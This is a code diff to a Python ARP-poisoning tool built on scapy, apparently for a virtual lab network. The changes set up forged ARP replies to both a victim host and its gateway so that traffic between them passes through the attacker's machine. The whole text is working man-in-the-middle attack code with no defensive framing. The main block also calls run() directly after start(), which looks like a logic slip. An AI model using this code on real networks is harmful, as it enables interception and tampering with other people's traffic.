@@ -41,7 +41,7 @@ class ArpPoisoner(multiprocessing.Process):
             for packet in self.packets:
                 sendp(packet, iface = self.interface, verbose=0)
             
-            time.sleep(1)
+            time.sleep(2)
 
     def stop(self):
         """Stops the sending of the spoofing packets."""
@@ -51,10 +51,20 @@ class ArpPoisoner(multiprocessing.Process):
 
 if __name__ == "__main__":
     
-    arp_poisoner = ArpPoisoner("enp0s3")
+    arp_poisoner = ArpPoisoner("enp0s10")
+    mac_attacker = "08:00:27:52:b1:13"
+    mac_victim = "08:00:27:69:ca:f1"
+    mac_gateway = "52:54:00:12:35:00"
+    ip_attacker = "10.0.123.6"
+    ip_victim = "10.0.123.5"
+    ip_gateway = "10.0.123.1"
+    # Create packet to send to victim
+    arp_poisoner.add_packet(mac_attacker, mac_victim, ip_gateway, ip_victim)
 
-    arp_poisoner.create_packet("08:00:27:cc:08:6f", "08:00:27:b7:c4:af", "192.168.56.102", "192.168.56.101")
+    # Create packet to send to gateway
+    arp_poisoner.add_packet(mac_attacker, mac_gateway, ip_victim, ip_gateway)
 
     arp_poisoner.start()
-    time.sleep(5)
+    arp_poisoner.run()
+    time.sleep(10)
     arp_poisoner.stop()
